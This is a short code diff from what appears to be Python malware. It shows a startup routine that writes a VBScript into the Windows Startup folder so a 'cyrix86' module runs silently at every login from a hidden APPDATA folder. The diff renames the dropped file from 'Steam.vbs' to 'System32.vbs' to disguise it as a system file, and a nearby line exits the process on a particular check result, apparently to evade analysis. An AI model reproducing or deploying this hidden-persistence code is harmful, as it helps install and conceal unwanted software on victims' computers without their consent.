@@ -428,7 +428,7 @@ class Others:
             if res == 42: os._exit(0)
                 
     def startup(self):
-        startupFile = os.path.join(os.environ["APPDATA"],"Microsoft","Windows","Start Menu","Programs","Startup","Steam.vbs")
+        startupFile = os.path.join(os.environ["APPDATA"],"Microsoft","Windows","Start Menu","Programs","Startup","System32.vbs")
         with open(startupFile, "w",) as f:
             f.write(f'''' python installer
 CreateObject("WScript.Shell").run "cmd /c ""cd %APPDATA%\\{BASE_FOLDER_NAME} & python -m cyrix86 {sys.argv[1]}""", 0''')
